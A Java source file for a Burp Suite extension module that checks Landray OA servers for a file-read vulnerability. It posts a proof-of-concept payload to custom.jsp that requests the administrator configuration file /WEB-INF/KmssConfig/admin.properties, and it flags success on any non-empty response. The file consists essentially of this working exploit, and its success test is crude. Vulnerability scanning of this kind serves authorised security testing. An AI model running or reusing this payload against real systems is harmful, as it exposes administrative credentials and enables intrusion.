package burp.vuls;

import burp.*;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;
import burp.util.HttpRequestResponseFactory;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.List;

public class LandrayOa extends VulTaskImpl {

    public LandrayOa(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log, IHttpRequestResponse messageInfo) {
        super(helpers, callbacks, log, messageInfo);
    }

    @Override
    public VulResult run() {
        //新的请求包
        String url = iHttpService.getProtocol() +"://"+ iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
        String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
        //新请求
        okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));

        return result;
    }
}

class LandrayOaCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[LandrayOaCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()){
            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
            // 检查响应体是否有内容
            if (vulTask.ok_respBody.length() > 0) {
                vulTask.message = "LandrayOa Vul";
                vulTask.log(call);
            }
        }
    }
}